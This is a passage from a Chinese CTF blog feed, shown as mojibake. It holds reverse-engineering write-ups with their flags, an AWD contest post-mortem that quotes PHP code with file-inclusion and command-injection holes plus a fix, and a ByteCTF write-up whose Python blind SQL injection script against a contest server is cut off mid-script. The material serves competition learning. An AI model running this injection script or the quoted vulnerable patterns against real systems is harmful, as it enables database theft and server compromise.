ï¼ï¼</p><p>ç„¶åå¯ä»¥è½½å…¥ODè¿›è¡ŒåŠ¨æ€åˆ†æäº†ã€‚</p><p>ä¸ºäº†æ–¹ä¾¿è°ƒè¯•ï¼Œæˆ‘ä»¬çŸ¥é“ç¨‹åºè¿è¡Œåï¼Œä¼šæç¤ºè¾“å…¥å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…ˆæ‰¾åˆ°è¾“å…¥å­—ç¬¦ä¸²çš„åœ°æ–¹ã€‚</p><p>ç„¶åå¼€å§‹å•æ­¥è·Ÿè¸ªåˆ°è¿™é‡Œï¼Œå°±æ˜¯å®Œæˆå­—ç¬¦ä¸²è¾“å…¥å</p><p>ç»§ç»­è·Ÿè¸ªï¼Œæˆ‘ä»¬å‘ç°ä¸€ä¸ªbase64çš„å­—ç¬¦ä¸²ï¼šdQkLdqXP=mLMAa8p=lnncQcq/GEPdGKXcNDl=Mnr=pcoBGPQdG1NA3Aw</p><p>é‚£ä¹ˆå¦å¤–ä¸€ä¸ªå­—ç¬¦ä¸²å°±æ˜¯base64çš„å­—å…¸äº†ï¼Œä¹Ÿå°±æ˜¯ï¼š0123456789+/=ABCDEFGHIabcdefghiJKLMNOPQRSTUVWXYZjklmnopqrstuvwxyz</p><p>äºæ˜¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ ¹æ®è¿™ä¸ªå¯¹base64ziâ€™få­—ç¬¦ä¸²è¿›è¡Œè§£å¯†ï¼š</p><p>å‘äº†ï¼Œç«Ÿç„¶æ˜¯ä¹±ç ï¼Œè¿˜ä»¥ä¸ºå°±è¿™æ ·æå®šäº†å‘¢ï¼Œåæ¥è¯·æ•™äº†ä¸€ä¸‹å¤§ç¥ï¼Œä»–è¯´æ˜¯å­—å…¸æœ‰é—®é¢˜ï¼Œäºæ˜¯æˆ‘ä»”ç»†çš„çœ‹äº†ä¸€ä¸‹ï¼Œç¡®å®</p><p>å­—å…¸é‡Œé¢æŒ‰è¯´æ˜¯ä¸åº”è¯¥æœ‰â€˜=â€™ è¿™ä¸ªå­—ç¬¦çš„ï¼ŒæŒ‰base64çš„è¯´æ³•è¿™ä¸ªæ˜¯å ä½ç”¨çš„æ¥è¡¥è¶³å­—èŠ‚æ•°ã€‚æ‰€ä»¥æŒ‰ç…§å¤§ç¥çš„æŒ‡ç‚¹ï¼Œæˆ‘æŠŠå¤§ç¥çš„è„šæœ¬ç”¨C++é‡æ–°å†™äº†ä¸€éï¼ˆä¹Ÿæ˜¯ä¸ºäº†æ›´å¥½çš„ç†è§£åå‘åˆ†æçš„è¿‡ç¨‹ï¼‰ï¼Œç»ˆäº†è·‘å‡ºæ¥äº† T_T</p><p>æœ€åï¼Œå°±æ˜¯è§è¯å¥‡è¿¹çš„æ—¶åˆ»åˆ°äº† * ^_^ *</p><p>flag{e38b5b63-4bf7-4ee8-b422-83f599fe0c43}</p><h3 id="Md5Jungle"><a href="#Md5Jungle" class="headerlink" title="Md5Jungle"></a>Md5Jungle</h3><p>é¦–å…ˆæŸ¥å£³ï¼Œä¸¢åˆ°exeinfopeé‡Œé¢ä¸€çœ‹ï¼Œå‘ç°æ˜¯aspçš„å£³ã€‚</p><p>äºæ˜¯ç”¨æ‰‹å¤´çš„aspè„±å£³å·¥å…·å°è¯•è„±å£³ï¼Œå‘ç°éƒ½ä¸è¡Œï¼Œä¸æ˜¯ä¸æ”¯æŒå°±æ˜¯æŠ¥é”™ï¼æ²¡åŠæ³•ï¼Œåªèƒ½è€å®æ‰‹å·¥è„±å£³äº†ã€‚</p><p>æ ¹æ®ESPå®šå¾‹+IATä¿®å¤+é‡å®šå‘è¡¨ä¿®å¤åï¼Œè„±å£³çš„ç¨‹åºå¯ä»¥æ­£å¸¸è¿è¡Œã€‚</p><p>ç”¨ODè½½å…¥åï¼Œå¼€å§‹å•æ­¥è·Ÿè¸ª</p><p>åˆ°ç”¨æˆ·è¾“å…¥ç•Œé¢ï¼Œæˆ‘éšä¾¿è¾“å…¥äº†ä¸ªå­—ç¬¦ä¸²ï¼š111111111ï¼ˆ9ä¸ª1ï¼‰å•æ­¥è·Ÿå…¥åˆ°ä¸‹å›¾ï¼Œå‘ç°äº†flagå­—æ ·</p><p>è¿™ä¸ªåº”è¯¥æ˜¯flagçš„å¤´ï¼Œäºæ˜¯ç»§ç»­è·Ÿè¿›ï¼Œå‘ç°ç¡®å®åœ¨æ ¸å¯¹è¾“å…¥æ•°æ®ä¸flag{æ¯”è¾ƒï¼Œè¿™å—å°±è¿‡ä¸å»äº†</p><p>äºæ˜¯æœæ–­çš„ä»æ¥ï¼Œè¾“å…¥æ•°æ®ä¸º flag{111111111ï¼Œæ¥åˆ°äº†ä¸‹å›¾çš„åœ°æ–¹ï¼Œåœ¨0x16çš„ä½ç½®æ¯”è¾ƒ0x7D ä¹Ÿå°±æ˜¯â€™}â€™ç¬¦å·</p><p>ç”±äºCè¯­è¨€çš„å­—ç¬¦ä¸²ä¸‹æ ‡æ˜¯ä»0å¼€å§‹çš„ï¼Œä¹Ÿå°±æ˜¯å­—ç¬¦ä¸²ç¬¬23ä¸ªå­—ç¬¦å¤„å¿…é¡»æ˜¯}</p><p>äºæ˜¯æ„é€ å­—ç¬¦ä¸²ï¼šflag{11111111111111111} ç»§ç»­è·Ÿè¿›ï¼Œæ¥ä¸‹æ¥æ˜¯åœ¨0x7ã€0xcã€0x11å¤„æ ¸å¯¹å­—ç¬¦ â€˜-â€˜ (å³ï¼š0x2D)</p><p>äºæ˜¯å­—ç¬¦ä¸²å°±å˜æˆäº†flag{11-1111-1111-1111}ï¼Œç»§ç»­è·Ÿè¿›ï¼Œå‘ç°äº†ä¸€ä¸ªå­—ç¬¦ä¸²ï¼š01E3421C=dump_SCY.01E3421C (ASCII â€œc7218260ef2b966ab0454e07c55cf4e9â€)<br>æ„Ÿè§‰åƒæ˜¯MD5çš„å­—ç¬¦ä¸²ï¼Œäºæ˜¯ç”¨pythonè§£äº†ä¸€ä¸‹ï¼Œå¾—åˆ°ï¼š ohï¼Œç»“ä¹‹å‰çš„flagåº”è¯¥å°±æ˜¯flag{oh-1111-1111-1111}</p><p>å†æ¬¡è¾“å…¥åï¼Œç»§ç»­è·Ÿè¿›å‘ç°è¿‡å»äº†ï¼Œå¼€å§‹è¿›è¡Œç¬¬äºŒæ®µçš„æ¯”è¾ƒå¾—åˆ°äº†ä¸‹å›¾çš„é”™è¯¯ï¼š</p><p>äºæ˜¯åå¤è·Ÿæ¯”è¾ƒç®—æ³•ä¹Ÿæ²¡æœ‰æ‰¾åˆ°ä»»ä½•æœ‰æ•ˆçš„æ•°æ®ï¼Œç»“åˆæœ¬é¢˜çš„æç¤ºæ˜¯md5æ®µå­—èŠ‚çˆ†ç ´ï¼Œä¼°è®¡æ˜¯è¿™å—éœ€è¦è¿›è¡Œçˆ†ç ´å¤„ç†äº†ã€‚</p><p>äºæ˜¯ç»§ç»­pythonå¤§æ³•ï¼Œå¾—åˆ°å­—ç¬¦ä¸²ï¼šflag{oh-aa30-1111-1111}</p><p>ç»§ç»­è¾“å…¥åï¼Œå•æ­¥è·Ÿè¿›ï¼Œæ­¤æ—¶å‘ç°ä¸€ä¸ªå­—ç¬¦ä¸²ï¼šå †æ ˆåœ°å€=001DFC30, (ASCII â€œYTkxYQ==â€)   eax=786B5459<br>çœ‹èµ·æ¥åƒB64ç¼–ç ï¼Œäºæ˜¯å°è¯•è§£ç ï¼Œå¾—åˆ°ç¬¬ä¸‰ç»„çš„flagå€¼ï¼ša91a ã€‚</p><p>æƒ³èµ·ä¹‹å‰ç”¨odä¹Ÿçœ‹è¿‡å­—ç¬¦ä¸²ï¼Œäºæ˜¯æ‰¾åˆ°ç¬¬å››ç»„çš„å­—ç¬¦ä¸²ï¼šNGZicA==   ï¼Œè§£ç ä¸ºï¼š4fbp</p><p>é‚£ä¹ˆæœ€ç»ˆçš„flagå°±æ˜¯ï¼šflag{oh-aa30-a91a-4fbp}</p><h3 id="shy"><a href="#shy" class="headerlink" title="shy"></a>shy</h3><p> é¦–å…ˆæŸ¥å£³ï¼Œä¸¢åˆ°ExeinfoPEé‡Œé¢çœ‹ä¸€ä¸‹ï¼Œç¡®å®šæ˜¯upxå£³</p><p>äºæ˜¯ä¸¢åˆ°ODé‡Œé¢è¿›è¡Œè„±å£³å¤„ç†ï¼Œç”±äºæ˜¯å‹ç¼©å£³ï¼Œè·Ÿè¸ªèµ·æ¥æ¯”è¾ƒéº»çƒ¦ï¼Œæˆ‘é€‰æ‹©äº†ä¸ªå·æ‡’çš„åŠæ³•ï¼Œä¸‹ä¸€ä¸ªapiè®¿é—®æ–­ç‚¹</p><p>å³ï¼šVirtualProtect ï¼Œè¿è¡Œ3æ¬¡F9åå°±è·‘é£äº†ï¼Œäºæ˜¯åœ¨2æ¬¡è¿è¡Œåï¼Œå•æ­¥è·Ÿè¸ªï¼Œåˆ°OEP</p><p>ä½¿ç”¨ODè‡ªå¸¦çš„æ’ä»¶è¿›è¡Œè„±å£³ï¼Œæ³¨æ„åŸºå€å’ŒOEPçš„å…³ç³»ï¼Œè®¡ç®—å¥½åå¡«å…¥</p><p>ç„¶åç‚¹å‡»è„±å£³ï¼ŒåŒå‡»å‘ç°ä¸èƒ½è¿è¡Œã€‚</p><p>è¿™ä¸ªé—®é¢˜ä¼°è®¡æ˜¯é‡å®šå‘é€ æˆï¼Œäºæ˜¯ä¿®å¤ä¸€ä¸‹é‡å®šå‘è¡¨çš„æ•°æ®ã€‚</p><p>ä¿å­˜åï¼Œå†æ¬¡è¿è¡Œå¯ä»¥æ­£å¸¸è·‘èµ·æ¥äº†</p><p>å†æ¬¡ç”¨ODè½½å…¥ï¼Œå‘ç°å…¥å£åœ°å€ä¸æ˜¯OEP</p><p>æŒ‰è¯´æ˜¯å·²ç»è§£å¯†å®Œæˆäº†ï¼Œäºæ˜¯æˆ‘å®šä½åˆ°OEP ï¼ˆ0x1072940ï¼‰ä¸€çœ‹ç©¶ç«Ÿã€‚</p><p>ç¡®å®å·²ç»è§£å¯†ï¼Œé‚£ä¹ˆä¸ºäº†æ–¹ä¾¿è°ƒè¯•ï¼Œæˆ‘ç›´æ¥ç”¨ODæ”¹ä¸€ä¸‹å…¥å£ä»£ç å°±å¯ä»¥å®ç°äº†ã€‚</p><p>ç„¶åæŠŠä¿®æ”¹å®Œæ¯•çš„ç¨‹åºï¼Œé‡æ–°ä¿å­˜åˆ°æ–‡ä»¶ï¼Œç”±äºæœ‰é‡å®šä½ä¼šæœ‰ä¸‹å›¾çš„æç¤ºï¼Œç‚¹å‡» æ˜¯ ï¼Œç„¶åå³é”®ä¿å­˜ä¸€ä»½dump0.exe</p><p>ç»§ç»­ï¼ŒODè½½å…¥dump0.exe å‘ç°ä¿®æ”¹æˆåŠŸï¼Œå¯ä»¥ç›´æ¥è·³è½¬åˆ°OEPè¡Œï¼Œç„¶åå•æ­¥è·Ÿè¸ªï¼Œåˆ°è¾“å…¥åï¼Œå‘ç°åé¢çš„ä»£ç æ˜¯ä¸ªåŠ å¯†å¤„ç†çš„ä»£ç ï¼Œäºæ˜¯ä¸¢åˆ°IDAé‡Œé¢çœ‹ä¸€ä¸‹è¿™å—å¯¹åº”çš„åç¼–è¯‘ä»£ç ã€‚</p><p>buf å°±æ˜¯ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œif ( <em>(&amp;v4 + j) != v79[j] )   è¿™ä¸ªå°±æ˜¯å…³é”®çš„æ¯”è¾ƒï¼Œé‚£ä¹ˆV79[]å°±åº”è¯¥æ˜¯å¼‚æˆ–åçš„ç»“æœï¼Œä¹Ÿå°±æ˜¯benæœ¬é¢˜çš„å¯†é’¥ï¼Œäºæ˜¯åœ¨ODä¸­å®šä½å€¼ï¼š6ljh,!;:+&amp;p%i*a=Sc4#pt</em>%</p><p>æ¥ä¸‹æ¥å°±ç®€å•äº†ï¼Œç›´æ¥æŠŠè¿™ä¸ªå¯†é’¥è¾“å…¥ï¼Œç„¶åå†æ¬¡å®šä½åˆ°è¿™å—å°±èƒ½å¾—åˆ°flagäº†</p><p>æœ€ç»ˆå¾—åˆ°flagï¼šflag{cb7670ab-c597-4b17}   è¾“å…¥åˆ°shy.exe éªŒè¯ä¸€ä¸‹ : )</p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/04/20/byb2019/">http://blog.ccreater.top/2020/04/20/byb2019/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç™¾è¶Šæ¯æ€»ç»“</title>
      <link href="/2020/04/20/byb2019%E7%BA%BF%E4%B8%8Bawd/"/>
      <url>/2020/04/20/byb2019%E7%BA%BF%E4%B8%8Bawd/</url>
      
        <content type="html"><![CDATA[<h1 id="ç™¾è¶Šæ¯æ€»ç»“"><a href="#ç™¾è¶Šæ¯æ€»ç»“" class="headerlink" title="ç™¾è¶Šæ¯æ€»ç»“"></a>ç™¾è¶Šæ¯æ€»ç»“</h1><h2 id="include-require"><a href="#include-require" class="headerlink" title="include,require"></a>include,require</h2><p>å¦‚æœ<strong>æ–‡ä»¶è¢«åŒ…å«ä¸¤æ¬¡</strong>ï¼ŒPHP 5   <strong>å‘å‡ºè‡´å‘½é”™è¯¯</strong>å› ä¸ºå‡½æ•°å·²ç»è¢«å®šä¹‰ï¼Œä½†æ˜¯ PHP 4 ä¸ä¼šå¯¹åœ¨   <a href="mk:@MSITStore:D:\ctf\æ‰‹å†Œ\php_manual_zh.chm::/res/function.return.html">return</a> ä¹‹åå®šä¹‰çš„å‡½æ•°æŠ¥é”™ã€‚æ¨èä½¿ç”¨   <a href="mk:@MSITStore:D:\ctf\æ‰‹å†Œ\php_manual_zh.chm::/res/function.include-once.html">include_once</a> è€Œä¸æ˜¯æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å·²åŒ…å«å¹¶åœ¨åŒ…å«æ–‡ä»¶ä¸­æœ‰æ¡ä»¶è¿”å›ã€‚ </p><h2 id="include-once-require-once"><a href="#include-once-require-once" class="headerlink" title="include_once,require_once"></a>include_once,require_once</h2><p><em>include_once</em> è¯­å¥åœ¨è„šæœ¬æ‰§è¡ŒæœŸé—´åŒ…å«å¹¶è¿è¡ŒæŒ‡å®šæ–‡ä»¶ã€‚æ­¤è¡Œä¸ºå’Œ   <a href="mk:@MSITStore:D:\ctf\æ‰‹å†Œ\php_manual_zh.chm::/res/function.include.html">include</a>   è¯­å¥ç±»ä¼¼ï¼Œå”¯ä¸€åŒºåˆ«æ˜¯å¦‚æœè¯¥æ–‡ä»¶ä¸­å·²ç»è¢«åŒ…å«è¿‡ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å«ã€‚å¦‚åŒæ­¤è¯­å¥åå­—æš—ç¤ºçš„é‚£æ ·ï¼Œåªä¼šåŒ…å«ä¸€æ¬¡ã€‚</p><p><em>require_once</em> è¯­å¥å’Œ <a href="mk:@MSITStore:D:\ctf\æ‰‹å†Œ\php_manual_zh.chm::/res/function.require.html">require</a>   è¯­å¥å®Œå…¨ç›¸åŒï¼Œå”¯ä¸€åŒºåˆ«æ˜¯ PHP ä¼šæ£€æŸ¥è¯¥æ–‡ä»¶æ˜¯å¦å·²ç»è¢«åŒ…å«è¿‡ï¼Œå¦‚æœæ˜¯åˆ™ä¸ä¼šå†æ¬¡åŒ…å«ã€‚ </p><p><strong>å¦‚æœæ‰€åŒ…å«æ–‡ä»¶ä¸å­˜åœ¨,include_onceä¸ä¼šé€€å‡º,è€Œrequire_onceä¼šç›´æ¥é€€å‡º</strong></p><h2 id="æ¯”èµ›å¤±è¯¯åŸå› "><a href="#æ¯”èµ›å¤±è¯¯åŸå› " class="headerlink" title="æ¯”èµ›å¤±è¯¯åŸå› "></a>æ¯”èµ›å¤±è¯¯åŸå› </h2><h3 id="logæ²¡æŒ‚å¥½"><a href="#logæ²¡æŒ‚å¥½" class="headerlink" title="logæ²¡æŒ‚å¥½"></a>logæ²¡æŒ‚å¥½</h3><h3 id="æ²¡æœ‰æ‰¾åˆ°æœ‰æ•ˆçš„æ”»å‡»æµé‡"><a href="#æ²¡æœ‰æ‰¾åˆ°æœ‰æ•ˆçš„æ”»å‡»æµé‡" class="headerlink" title="æ²¡æœ‰æ‰¾åˆ°æœ‰æ•ˆçš„æ”»å‡»æµé‡"></a>æ²¡æœ‰æ‰¾åˆ°æœ‰æ•ˆçš„æ”»å‡»æµé‡</h3><p>grepè¿™ä¸ªå‘½ä»¤ä¸å¤Ÿç†Ÿæ‚‰,</p><h4 id="system"><a href="#system" class="headerlink" title="system"></a>system</h4><p>æˆ‘çš„è¿‡æ»¤æ¡ä»¶å˜è¿:</p><p><code>&quot;flag&quot; =&gt; &quot;/flag&quot;</code>,åˆ°è¿™é‡Œåæˆ‘å°±æ²¡æœ‰ç»§ç»­è¿‡æ»¤,â€/flagâ€å…¶å®è¿˜æ˜¯æœ‰å¾ˆå¤šå¹²æ‰°ä¿¡æ¯çš„,æˆ‘å°±å·®ä¸€æ­¥</p><p><code>grep &quot;/flag &quot; */*</code></p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91fl7ptrij30k20arac7.jpg" alt="image.png"></p><p><code>grep &quot;/flag &quot; */* -C300 | grep &quot;end pageheader&quot; -C 10</code></p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91fk6h3jxj30oa05cdfx.jpg" alt="image.png"></p><h3 id="æ²¡æ‰¾åˆ°çš„æ´"><a href="#æ²¡æ‰¾åˆ°çš„æ´" class="headerlink" title="æ²¡æ‰¾åˆ°çš„æ´"></a>æ²¡æ‰¾åˆ°çš„æ´</h3><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91c2qcxxyj30pl01vdgk.jpg" alt="image.png"></p><p>phpçš„webä¸»è¦ä¹Ÿå°±è¿™ä¸¤çš„æ´</p><h4 id="grayscale"><a href="#grayscale" class="headerlink" title="grayscale"></a>grayscale</h4><p><code>include $_GET[&#39;img&#39;];</code>é…åˆæœ‰åé—¨çš„å›¾ç‰‡m.jpg</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91c4zci7cj30f001g3yg.jpg" alt="image.png"></p><p>å¼€å§‹æˆ‘ç›´æ¥æœç´¢<code>&lt;?</code>å’Œ<code>&lt;%</code> æ²¡æœç´¢åˆ°å°±ä»¥ä¸ºæ˜¯è¯¯æŠ¥,??ä¹Ÿèƒ½æ‰§è¡Œ?????</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g91c93p00wj307100zjr6.jpg" alt="image.png"></p><p>ç”¨stringsæŸ¥çœ‹////,ç¼–ç é—®é¢˜å¯¼è‡´??,ä»¥åç”¨asciiç æ¥æŸ¥çœ‹</p><h4 id="ssystem"><a href="#ssystem" class="headerlink" title="ssystem"></a>ssystem</h4><p>è™½ç„¶æ‰¾åˆ°äº†execé‚£ä¸ªæ´</p><p>ä½†æ˜¯åœ¨index.phpä¸­ï¼š</p><pre><code class="php">&lt;?phpif (isset($_GET[&#39;page&#39;])){    $page = $_GET[&#39;page&#39;];}else{        $page = &#39;chart.php&#39;;}?&gt;&lt;?php    include_once &quot;$page&quot;;?&gt;</code></pre><p>å¯ä»¥é…åˆæ–‡ä»¶ä¸Šä¼ æ‹¿åˆ°shellæˆ–è€…æ˜¯ç›´æ¥include /flagä¹Ÿèƒ½æ‹¿åˆ°flag</p><h3 id="æ´æ²¡ä¿®å¥½"><a href="#æ´æ²¡ä¿®å¥½" class="headerlink" title="æ´æ²¡ä¿®å¥½"></a>æ´æ²¡ä¿®å¥½</h3><h4 id="SSystem"><a href="#SSystem" class="headerlink" title="SSystem"></a>SSystem</h4><pre><code class="php">    &lt;?php    if (isset($_POST[&#39;name&#39;])){        $name = $_POST[&#39;name&#39;];        exec(&quot;tar -cf backup/$name images/*.jpg&quot;);        echo &quot;&lt;div class=\&quot;alert alert-success\&quot; role=\&quot;alert\&quot;&gt;                å¯¼å‡ºæˆåŠŸ,&lt;a href=&#39;backup/$name&#39;&gt;ç‚¹å‡»ä¸‹è½½&lt;/a&gt;&lt;/div&gt;&quot;;    }    ?&gt;</code></pre><p>åŸæœ¬ä»¥ä¸º<code>$name</code>å†å‚æ•°ä½ç½®,ç”¨escapeshellargå°±å¯ä»¥äº†</p><p>ä½†æ˜¯!!!!!!!è™½ç„¶escapeshellargä¼šæŠŠ$nameæ”¾åœ¨å¼•å·é‡Œé¢</p><pre><code>escapeshellarg() å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œå¹¶ä¸”è¿˜æ˜¯ç¡®ä¿å®‰å…¨çš„ã€‚å¯¹äºç”¨æˆ·è¾“å…¥çš„éƒ¨åˆ†å‚æ•°å°±åº”è¯¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°ã€‚shell å‡½æ•°åŒ…å« exec(), system() æ‰§è¡Œè¿ç®—ç¬¦ ã€‚ </code></pre><p>phpæ‰‹å†Œé‡Œè§£é‡Šæ˜¯å•å¼•å·,å®é™…å´æ˜¯<code>tar -cf backup/&quot;123&quot; images/*.jpg</code></p><p>?????è¿™æ˜¯åœ¨æˆ‘æœ¬æœºphp5.6çš„ç¯å¢ƒä¸‹,php7ç¯å¢ƒä¹Ÿæ˜¯åŒå¼•å·???</p><p>ç„¶ååœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šä¹‹å‰æ˜¯åŒå¼•å·åé¢æ˜¯å•å¼•å·????</p><p>ç”±äºä¸çŸ¥é“é¶åœºä¸Šä¼šæ€æ ·,æˆ‘ä¹Ÿä¸ç¡®å®šæˆ‘ç”¨escapeshellargæ˜¯ä¸æ˜¯ä¿®å¥½äº†,ç„¶åè¿™é¢˜å°±ä¿®è¡¥å¤±è´¥äº†</p><p>æ¯”è¾ƒå¥½çš„ä¿®å¤æ–¹æ¡ˆ(åœ¨å®ç°åŸåŠŸèƒ½çš„æƒ…å†µä¸‹å»æ‰å‘½ä»¤æ‰§è¡Œ):</p><pre><code>exec(&quot;tar -cf backup/aa.tar images/*.jpg&quot;);rename(&quot;backup/aa.tar&quot;,&quot;backup/$name.tar&quot;);</code></pre><h3 id="æ²¡æ‰¾åˆ°checkæ²¡è¿‡çš„åŸå› "><a href="#æ²¡æ‰¾åˆ°checkæ²¡è¿‡çš„åŸå› " class="headerlink" title="æ²¡æ‰¾åˆ°checkæ²¡è¿‡çš„åŸå› "></a>æ²¡æ‰¾åˆ°checkæ²¡è¿‡çš„åŸå› </h3><p>checkçš„idæ˜¯172.16.4.7</p><p>ä½†æ˜¯ç›´æ¥æœç´¢ HTTP æ²¡æ‰¾åˆ°checkæ²¡è¿‡çš„åŸå› ,æˆ‘çŒœå› ä¸ºæ‹–ä¸‹æ¥çš„logåªæœ‰å‰åŠå°æ—¶,è€Œå¼€å±€çš„æ˜¯å¦æˆ‘ä»¬çš„checkå¥½åƒæ˜¯è¿‡çš„</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æˆ‘çœ‹åˆ°æ´çš„æ—¶å€™æ²¡æœ‰ä¿®å¥½</p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/04/20/byb2019çº¿ä¸‹awd/">http://blog.ccreater.top/2020/04/20/byb2019çº¿ä¸‹awd/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bytectf wp</title>
      <link href="/2020/04/20/bytectfwp/"/>
      <url>/2020/04/20/bytectfwp/</url>
      
        <content type="html"><![CDATA[<h1 id="bytectf-wp"><a href="#bytectf-wp" class="headerlink" title="bytectf wp"></a>bytectf wp</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="baby-blog"><a href="#baby-blog" class="headerlink" title="baby_blog"></a>baby_blog</h3><p>åœ¨edit.phpä¸­:</p><pre><code class="php">if($_SESSION[&#39;id&#39;] == $row[&#39;userid&#39;]){        $title = addslashes($_POST[&#39;title&#39;]);        $content = addslashes($_POST[&#39;content&#39;]);        $sql-&gt;query(&quot;update article set title=&#39;$title&#39;,content=&#39;$content&#39; where title=&#39;&quot; . $row[&#39;title&#39;] . &quot;&#39;;&quot;);    }</code></pre><p><code>$sql-&gt;query(&quot;update article set title=&#39;$title&#39;,content=&#39;$content&#39; where title=&#39;&quot; . $row[&#39;title&#39;] . &quot;&#39;;&quot;);</code></p><p>$row[â€˜titleâ€™] æ²¡æœ‰è¿›è¡Œä»»ä½•è¿‡æ»¤,ç›´æ¥æ’å…¥åˆ°sqlè¯­å¥ä¸­,è€Œæ’å…¥æ•°æ®åº“ä¸­çš„titleæ²¡æœ‰å†æ¬¡å¯¹å¼•å·è¿›è¡Œè½¬ä¹‰,å½¢æˆæ³¨å…¥ç‚¹</p><p>sqlç›²æ³¨åˆ¤æ–­è„šæœ¬:</p><pre><code class="python">import requestsfrom bs4 import BeautifulSoupanti_disturb_key=&#39;cjb_ccreater_s_test&#39;PHPSESSID=&#39;404i3uiletdpke9rb0egs7vf47&#39;check_article_id=20def check(check_title):    url=&#39;http://112.125.24.134:9999/edit.php?id=&#39;+str(check_article_id)    res=requests.get(url,cookies={&#39;PHPSESSID&#39;:PHPSESSID})    bs=BeautifulSoup(res.text, &#39;html.parser&#39;)    title=bs.find(&#39;input&#39;,attrs={&#39;name&#39;:&quot;title&quot;})[&#39;value&#39;]    content=bs.find(&#39;textarea&#39;,attrs={&#39;name&#39;:&quot;content&quot;}).text    if title[:len(anti_disturb_key)]!=anti_disturb_key :        return &#39;disturb&#39;    elif content!=&#39;success&#39;+check_title:        return &#39;false&#39;    else :        return &#39;success&#39;def make_write(title,info):    data={        &#39;title&#39;:title,        &#39;content&#39;:info    }    url=&#39;http://112.125.24.134:9999/writing.php&#39;    res=requests.post(url,data=data,cookies={&#39;PHPSESSID&#39;:PHPSESSID})    if res.status_code==200:        return True    else :        return Falsedef get_newest_id():    url=&#39;http://112.125.24.134:9999/index.php&#39;    res=requests.get(url,cookies={&#39;PHPSESSID&#39;:PHPSESSID})    bs=BeautifulSoup(res.text, &#39;html.parser&#39;)    newest_id=bs.find(&#39;article&#39;).find(&#39;footer&#39;).find(&#39;a&#39;)[&#39;href&#39;]    newest_id=newest_id[newest_id.index(&#39;=&#39;)+1:]    return int(newest_id)def sql_inject(sql):    title=anti_disturb_key+&quot;&#39; or (id=&quot;+str(check_article_id)+&quot; and (&quot;+sql+&#39;))#&#39;    info=&#39;success&#39;+title    if make_write(title,info):        #ç¼–è¾‘id=newest_idçš„æ–‡ç« æ¥è¯»å–$raw[&#39;title&#39;]        newest_id=get_newest_id()        url=&#39;http://112.125.24.134:9999/edit.php&#39;        data={            &#39;title&#39;:title,            &#39;content&#39;:info,            &#39;id&#39;:newest_id        }        res=requests.post(url,cookies={&#39;PHPSESSID&#39;:PHPSESSID},data=data)        #åˆ¤æ–­ç›²æ³¨ç»“æœ        result=check(title)        if result==&#39;success&#39;:            return True        elif result==&#39;disturb&#39;:            print(&quot;å—åˆ°å¹²æ‰°,é‡æ–°æ‰§è¡Œ&quot;)            return sql_inject(sql)        else :            return False    else :        print(&#39;ç¨‹åºæ‰§è¡Œé”™è¯¯,è¯·ä¿æŒç»“æœ&#39;)        eval(input(&#39;æ‰§è¡Œå‘½ä»¤:&#39;))#demo #sql=&#39;(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),index,1)))=guess&#39;sql=&#39;&#39;&#39;(select&#39;&#39;+conv(substr(hex(group_concat(table_name)),index,1),16,10) FROM information_schema.tables WHERE TABLE_SCHEMA=&#39;information_schema&#39;)=guess &#39;&#39;&#39;### 